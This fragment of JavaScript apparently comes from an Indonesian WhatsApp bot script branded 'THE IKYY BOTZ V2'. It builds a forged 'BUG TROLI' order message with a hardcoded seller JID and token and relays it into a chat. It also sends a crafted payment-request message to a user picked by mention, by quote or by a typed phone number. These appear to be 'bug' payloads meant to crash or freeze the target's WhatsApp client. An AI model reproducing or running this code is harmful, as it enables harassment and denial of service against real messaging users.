 ▰▱▰▱▰▱▰▱▰▱▰▱▰
...
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	...
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY 𝐓𝐇𝐄 𝐈𝐊𝐘𝐘 𝐁𝐎𝐓𝐙 V2 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281214281312@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
...
jobotz.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 𝐓𝐇𝐄 𝐈𝐊𝐘𝐘 𝐁𝐎𝐓𝐙`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttoniky}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ`,
